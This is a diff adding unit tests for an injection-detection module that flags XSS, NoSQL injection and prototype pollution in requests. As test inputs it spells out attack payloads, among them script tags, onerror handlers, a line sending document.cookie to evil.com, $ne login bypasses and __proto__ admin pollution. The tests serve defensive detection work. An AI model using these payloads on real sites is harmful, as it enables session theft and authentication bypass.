@@ -4,6 +4,9 @@ import {
   detectShellInjection,
   detectPathTraversal,
   detectSsrf,
+  detectXss,
+  detectNoSqlInjection,
+  detectPrototypePollution,
   scanRequest,
 } from "./injection.js";
 
@@ -191,5 +194,108 @@ describe("scanRequest", () => {
       referer: "http://169.254.169.254/latest",
     });
     expect(ssrfInReferer.threats.some((t) => t.type === "ssrf")).toBe(true);
+
+    const xssInQuery = scanRequest(
+      "GET",
+      "/search",
+      { q: "<script>alert(1)</script>" },
+      "",
+      {},
+    );
+    expect(xssInQuery.threats.some((t) => t.type === "xss")).toBe(true);
+
+    const nosqlInBody = scanRequest(
+      "POST",
+      "/login",
+      {},
+      '{"username": {"$gt": ""}}',
+      {},
+    );
+    expect(nosqlInBody.threats.some((t) => t.type === "nosql_injection")).toBe(
+      true,
+    );
+
+    const protoInQuery = scanRequest(
+      "GET",
+      "/settings",
+      { "__proto__.admin": "true" },
+      "",
+      {},
+    );
+    expect(
+      protoInQuery.threats.some((t) => t.type === "prototype_pollution"),
+    ).toBe(true);
+  });
+});
+
+describe("detectXss", () => {
+  it("should return detected: false for safe text", () => {
+    expect(detectXss("")).toEqual({ detected: false });
+    expect(detectXss("Hello world, this is a clean sentence.")).toEqual({
+      detected: false,
+    });
+    expect(detectXss("user@example.com")).toEqual({ detected: false });
+  });
+
+  it("should detect script tags and javascript pseudo-protocols", () => {
+    expect(detectXss("<script>alert(document.cookie)</script>").detected).toBe(
+      true,
+    );
+    expect(detectXss("<script src='http://evil.com/xss.js'></script>").detected).toBe(
+      true,
+    );
+    expect(detectXss("javascript:alert(1)").detected).toBe(true);
+    expect(detectXss("vbscript:msgbox(1)").detected).toBe(true);
+  });
+
+  it("should detect inline event handlers and data html uris", () => {
+    expect(detectXss("<img src=x onerror=alert(1)>").detected).toBe(true);
+    expect(detectXss("<svg onload=alert(1)>").detected).toBe(true);
+    expect(detectXss("<body onload = 'alert(1)'>").detected).toBe(true);
+    expect(detectXss("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==").detected).toBe(true);
+  });
+
+  it("should detect document.cookie theft attempts", () => {
+    expect(detectXss("var c = document.cookie;").detected).toBe(true);
+    expect(detectXss("window.location = 'http://evil.com/?c=' + document.cookie;").detected).toBe(true);
+  });
+});
+
+describe("detectNoSqlInjection", () => {
+  it("should return detected: false for safe text and words containing where", () => {
+    expect(detectNoSqlInjection("")).toEqual({ detected: false });
+    expect(detectNoSqlInjection("Where are you going today?")).toEqual({
+      detected: false,
+    });
+    expect(detectNoSqlInjection("select * from users where id = 1")).toEqual({
+      detected: false,
+    });
+  });
+
+  it("should detect MongoDB query operators in json or query format", () => {
+    expect(detectNoSqlInjection('{"$gt": ""}').detected).toBe(true);
+    expect(detectNoSqlInjection('{"password": {"$ne": null}}').detected).toBe(
+      true,
+    );
+    expect(detectNoSqlInjection('{"$regex": ".*"}').detected).toBe(true);
+    expect(detectNoSqlInjection("$where: function() { return true; }").detected).toBe(true);
+    expect(detectNoSqlInjection("user[$ne]=1").detected).toBe(true);
+  });
+});
+
+describe("detectPrototypePollution", () => {
+  it("should return detected: false for normal inputs", () => {
+    expect(detectPrototypePollution("")).toEqual({ detected: false });
+    expect(detectPrototypePollution("prototype pattern is a design pattern")).toEqual({
+      detected: false,
+    });
+  });
+
+  it("should detect __proto__ and constructor.prototype injection", () => {
+    expect(detectPrototypePollution("__proto__").detected).toBe(true);
+    expect(detectPrototypePollution('{"__proto__": {"isAdmin": true}}').detected).toBe(true);
+    expect(detectPrototypePollution("constructor.prototype.polluted = true").detected).toBe(true);
+    expect(detectPrototypePollution("constructor.prototype[polluted]").detected).toBe(true);
+    expect(detectPrototypePollution("__defineGetter__('admin', fn)").detected).toBe(true);
   });
 });
